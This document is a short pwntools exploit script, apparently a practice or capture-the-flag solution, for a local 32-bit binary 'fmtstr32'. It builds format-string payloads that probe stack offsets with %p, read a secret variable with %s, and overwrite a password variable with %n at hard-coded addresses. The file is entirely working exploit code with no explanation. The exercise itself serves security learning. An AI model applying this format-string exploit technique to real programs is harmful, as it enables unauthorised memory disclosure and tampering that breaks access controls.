#!/usr/bin/python3

from pwn import *

# readelf -s fmtstr32 | grep pass
PASS = 0x0804c034

# readelf -s fmtstr32 | grep secret
SECRET = 0x0804c028

strfirst = 1
fmtfirst = 2

target = ["./fmtstr32"]

def test(order=fmtfirst):
	payload = b''
	if order == strfirst:
		payload += p32(0x61626364)
		payload += b'%8$p...'
	if order == fmtfirst:
		payload += b'%10$p...'
		payload += p32(0x61626364)
	run(payload)

def leak(order=fmtfirst):
	payload = b''
	if order == strfirst:
		payload += p32(SECRET)
		payload += b'%8$s...'
	if order == fmtfirst:
		payload += b'%10$s...'
		payload += p32(SECRET)
	run(payload)

def exploit(order=fmtfirst):
	payload = b''
	if order == strfirst:
		payload += p32(PASS)
		payload += b'%8$n...'
	if order == fmtfirst:
		payload += b'%10$n...'
		payload += p32(PASS)
	run(payload)

def run(payload):
	p = process(target)
	p.recvuntil("\n")
	p.sendline(payload)
	p.interactive()

def main():
	test()
	leak()
	exploit()

if __name__ == "__main__":
	main()
